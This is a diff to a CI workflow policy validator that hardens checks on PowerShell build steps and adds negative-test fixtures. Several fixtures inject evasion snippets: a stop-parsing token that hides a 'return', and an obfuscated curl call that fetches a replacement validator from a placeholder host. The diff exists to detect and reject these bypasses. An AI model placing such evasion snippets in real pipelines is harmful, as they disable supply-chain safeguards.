@@ -152,7 +152,7 @@ const NETWORK_CLIENT = /\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|i
 // Enumerating the indirect writers (Set-Variable, New-Variable, the Variable:
 // provider, [ref] handles) is the same losing shape, so the whole reviewed
 // script is pinned instead: any edit at all changes this digest.
-const REVIEWED_VALIDATION_STEP_DIGEST = 'd5880b7ecb20dcfa4fc115bfadec92cd8b76129ffd4f4550dc9f785ac61651b7';
+const REVIEWED_VALIDATION_STEP_DIGEST = 'febb2a5e4656ade32ab2e5877aff5acc2c11434255195327e9f71ee57232c047';
 
 // The credential-cleanup step's assertions all test for the presence of a
 // sequence, and presence is not execution: an inserted early exit satisfies
@@ -231,7 +231,7 @@ const MARKDOWN_ACQUIRE = Object.freeze({
 // a silent one. This is a review signal rather than a runtime gate -- build.yml
 // does not run this validator, so what actually contains the generator at run
 // time is the process boundary and the byte comparison in that step.
-const REVIEWED_GENERATOR_DIGEST = 'bb8ba306acb130f8f7b5fcc75153f3c6bc69735ac5de4faffa6d38055535783f';
+const REVIEWED_GENERATOR_DIGEST = 'a0a447c09d6923b3d8519520521d30dc2f4a28f4ae42f341fd42d1a805ea6cc0';
 
 // The lint phases execute these two files out of the checkout. The rule
 // configuration decides which rules run at all, and the nested-fence helper is
@@ -244,7 +244,7 @@ const REVIEWED_LINT_DIGESTS = Object.freeze({
   'lint-nested-markdown.js': '4eefec7afba1c79809d916365b2eb3e2ea17aa482593338492a10d6dda5e2031',
 });
 
-const EXPECTED_VERSION = '1.0.20260731.0';
+const EXPECTED_VERSION = '1.0.20260802.0';
 const MAXIMUM_YAML_BYTES = 1024 * 1024;
 const MAXIMUM_NODE_COUNT = 10000;
 const MAXIMUM_DEPTH = 64;
@@ -599,6 +599,13 @@ export function validateBuildPolicy(workflow, source) {
     if (/[^\t\n\x20-\x7e]/u.test(run)) {
       reject('side-effect-policy', `${jobId}.${id} contains a character outside printable ASCII`);
     }
+    // --% is PowerShell's stop-parsing token: everything after it on the line
+    // becomes a literal native-command argument, so a brace following it is not
+    // syntax at all. The scanner would still count it. No governed step needs
+    // the token, so it is refused rather than modelled.
+    if (/--%/u.test(run)) {
+      reject('side-effect-policy', `${jobId}.${id} uses the stop-parsing token`);
+    }
     // No job in this workflow holds contents: write, so there is no approved
     // push, commit, or staging path anywhere in it. These are flat refusals
     // rather than exemptions keyed to a step id.
@@ -917,7 +924,7 @@ function validateAcquireStep(step, label, expected) {
   // so the invocation target is constrained rather than the spelling of the
   // name: an indirect call has no literal to match and is refused here
   // however the name was assembled.
-  for (const call of step.run.matchAll(/&\s+(\S+)/gu)) {
+  for (const call of step.run.matchAll(/&\s*(\S+)/gu)) {
     if (!['git', 'curl', 'tar'].includes(call[1])) {
       reject('acquire-policy', `${label} invokes something other than a reviewed literal command`);
     }
@@ -934,6 +941,9 @@ function validateAcquireStep(step, label, expected) {
   }
   if (/[^\t\n\x20-\x7e]/u.test(step.run)) {
     reject('acquire-policy', `${label} contains a character outside printable ASCII`);
+  }
+  if (/--%/u.test(step.run)) {
+    reject('acquire-policy', `${label} uses the stop-parsing token`);
   }
   if (createHash('sha256').update(step.run, 'utf8').digest('hex') !== expected.digest) {
     reject('acquire-policy', `${label} script does not match its reviewed digest`);
@@ -1060,6 +1070,9 @@ export function validateMarkdownPolicy(workflow, source) {
     'Get-FileHash -LiteralPath .markdownlint.jsonc -Algorithm SHA256',
     'Get-FileHash -LiteralPath lint-nested-markdown.js -Algorithm SHA256',
     'supply: lint configuration or helper does not match the reviewed digest',
+    // Taken again after the validator, which is itself repository-controlled
+    // and runs before both lint phases.
+    'supply: lint configuration or helper changed after policy validation',
   ];
   for (const fragment of requiredFragments) {
     if (!validation.run.includes(fragment)) reject('markdown-policy', `required phase is missing: ${fragment}`);
@@ -1085,6 +1098,8 @@ export function validateMarkdownPolicy(workflow, source) {
     'ci --ignore-scripts --no-audit --no-fund',
     'npm-ci: package metadata changed during frozen installation',
     './Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml',
+    // Between the validator and the phases it could otherwise disarm.
+    'supply: lint configuration or helper changed after policy validation',
     'run lint:md\n',
     'run lint:md:nested',
     'validation: package metadata changed after installation or linting',
@@ -1148,6 +1163,9 @@ export function validateMarkdownPolicy(workflow, source) {
   }
   if (/[^\t\n\x20-\x7e]/u.test(validation.run)) {
     reject('markdown-policy', 'markdown.validate-and-lint contains a character outside printable ASCII');
+  }
+  if (/--%/u.test(validation.run)) {
+    reject('markdown-policy', 'markdown.validate-and-lint uses the stop-parsing token');
   }
   // Each captured phase status must be assigned exactly once, from $LASTEXITCODE.
   // Otherwise a later reassignment such as "$intPolicyExit = 0" leaves every
@@ -1430,6 +1448,9 @@ const FIXTURE_INVENTORY = Object.freeze([
   // Appended after the revision check: overwrite the generator and hide it
   // behind the advisory assume-unchanged bit before verify snapshots it.
   ['T1-BUILD-126', 'statement appended after the build acquire revision check', 'build', (source) => replaceOnce(source, '          Write-Host "acquire: anonymous shallow checkout of $strSha"\n', '          Write-Host "acquire: anonymous shallow checkout of $strSha"\n          Copy-Item -LiteralPath ./tools/gen.ps1 -Destination ./.github/workflows/Generate-StyleGuideArtifacts.ps1 -Force\n')],
+  // --% makes the rest of the line a literal native-command argument, so the
+  // braces after it are not syntax while the scanner still counts them.
+  ['T1-BUILD-127', 'stop-parsing token used to hide a top-level return', 'build', (source) => replaceOnce(source, '          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n', '          /bin/echo --% {\n          return\n          /bin/echo --% }\n          & pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1\n')],
   // Inert text satisfies a substring match. This wraps the approved invocation
   // in a single-quoted here-string, so the command appears verbatim in the
   // script and never executes.
@@ -1522,6 +1543,13 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-MARKDOWN-033', 'extracted toolchain overwritten from the checkout', 'markdown', (source) => replaceOnce(source, '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n', '          Write-Host "acquire: revision $strSha and the reviewed Node distribution"\n          Copy-Item -LiteralPath ./tools/node -Destination $strNodeRoot/bin/node -Force\n')],
   // The client name assembled at run time, so no literal to count.
   ['T1-MARKDOWN-034', 'network client invoked through an assembled name', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          $strClient = 'cu' + 'rl'\n          & $strClient --silent --output ./.github/workflows/Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  // PowerShell does not require whitespace after the call operator, and it
+  // executes a command named by a parenthesised expression.
+  ['T1-MARKDOWN-035', 'call operator applied to a parenthesised expression', 'markdown', (source) => replaceOnce(source, "          $strNodeUrl = 'https://nodejs.org", "          &('cu' + 'rl') --output ./Validate-WorkflowPolicy.mjs https://example.invalid/v\n          $strNodeUrl = 'https://nodejs.org")],
+  // The validator runs before both lint phases and is repository-controlled,
+  // so the asset digests taken before it no longer describe what the linters
+  // read.
+  ['T1-MARKDOWN-036', 'lint assets no longer re-verified after policy validation', 'markdown', (source) => replaceOnce(source, "          $strLintConfigAfterPolicy = (Get-FileHash -LiteralPath .markdownlint.jsonc -Algorithm SHA256).Hash\n          $strLintHelperAfterPolicy = (Get-FileHash -LiteralPath lint-nested-markdown.js -Algorithm SHA256).Hash\n          if ($strLintConfigAfterPolicy -cne $strReviewedLintConfigHash -or $strLintHelperAfterPolicy -cne $strReviewedLintHelperHash) {\n              throw 'supply: lint configuration or helper changed after policy validation'\n          }\n", '')],
   ['T1-MARKDOWN-022', 'lint job regains a token scope', 'markdown', (source) => replaceOnce(source, '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions: {}\n', '  markdownlint:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n')],
   ['T1-LINTASSET-001', 'all rules disabled in the lint configuration', 'lint-asset', {
     '.markdownlint.jsonc': '{ "default": false }\n',
@@ -1645,7 +1673,7 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-013": "markdown-policy: required phase is missing: if ($strPackageBefore -cne $strReviewedPackageHash -or $strLockBefore -cne $strReviewedLockHash)",
   "T1-BUILD-042": "credential-policy: verify.generate-and-verify expands an unapproved credential",
   "T1-MARKDOWN-015": "markdown-policy: validation script adds control flow that can bypass a required phase",
-  "T1-MARKDOWN-016": "markdown-policy: required phases are out of order at: run lint:md\n",
+  "T1-MARKDOWN-016": "markdown-policy: required phases are out of order at: supply: lint configuration or helper changed after policy validation",
   "T1-MARKDOWN-014": "markdown-policy: required phase is missing: if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {",
   "T1-MARKDOWN-017": "markdown-policy: captured phase status intPolicyExit is not assigned exactly once",
   "T1-DEPENDABOT-001": "policy: Dependabot configuration differs from the locked policy",
@@ -1669,6 +1697,7 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-BUILD-124": "side-effect-policy: verify.generate-and-verify contains a character outside printable ASCII",
   "T1-BUILD-125": "acquire-policy: build.verify.acquire adds control flow that can bypass a required assertion",
   "T1-BUILD-126": "acquire-policy: build.verify.acquire does not end at the verified extraction",
+  "T1-BUILD-127": "side-effect-policy: verify.generate-and-verify uses the stop-parsing token",
   "T1-BUILD-104": "side-effect-policy: the generator is not invoked exactly once as a statement",
   "T1-BUILD-106": "side-effect-policy: verify.generate-and-verify uses a here-string or block comment",
   "T1-BUILD-105": "side-effect-policy: build.verify can suppress a probe failure after the generator runs",
@@ -1743,6 +1772,8 @@ const FIXTURE_EXPECTATIONS = Object.freeze({
   "T1-MARKDOWN-032": "acquire-policy: markdown.acquire network request count changed",
   "T1-MARKDOWN-033": "acquire-policy: markdown.acquire does not end at the verified extraction",
   "T1-MARKDOWN-034": "acquire-policy: markdown.acquire invokes something other than a reviewed literal command",
+  "T1-MARKDOWN-035": "acquire-policy: markdown.acquire invokes something other than a reviewed literal command",
+  "T1-MARKDOWN-036": "markdown-policy: required phase is missing: supply: lint configuration or helper changed after policy validation",
   "T1-PACKAGE-005": "supply-policy: resolved yaml parser integrity is not the reviewed value",
   "T1-PACKAGE-006": "policy: lockfile root devDependencies differs from the locked policy",
 });
@@ -1889,6 +1920,24 @@ export function validateLintAssetPolicy(assets) {
 // should say so, rather than reporting only that a hash moved.
 export function validateGeneratorPolicy(source) {
   parseGeneratorVersion(source, EXPECTED_VERSION);
+  // PowerShell resolves functions ahead of cmdlets, so an unqualified
+  // Get-Command is itself interceptable by a function of that name -- and this
+  // script uses it to find the git it then executes. CI is not exposed, since
+  // the workflow starts the script with pwsh -NoProfile -File in a fresh
+  // process, but a contributor running it inside an existing session is. The
+  // workflow policy already refuses Get-Command in the step that invokes this
+  // script; named here so a re-stamp of the digest below cannot quietly
+  // reintroduce the unqualified form.
+  if (!source.includes('Microsoft.PowerShell.Core\\Get-Command -Name \'git\'')) {
+    reject('supply-policy', 'the generator does not resolve Git through a module-qualified lookup');
+  }
+  // Comment lines are stripped first: the rationale above this check in the
+  // generator names the unqualified form in prose, and a rule that cannot
+  // tell prose from code would forbid explaining itself.
+  const generatorCode = source.split('\n').map((line) => line.replace(/#.*$/u, '')).join('\n');
+  if (/(?<!Microsoft\.PowerShell\.Core\\)Get-Command/u.test(generatorCode)) {
+    reject('supply-policy', 'the generator resolves a command through a shadowable lookup');
+  }
   if (createHash('sha256').update(source, 'utf8').digest('hex') !== REVIEWED_GENERATOR_DIGEST) {
     reject('supply-policy', 'generator does not match its reviewed digest');
   }
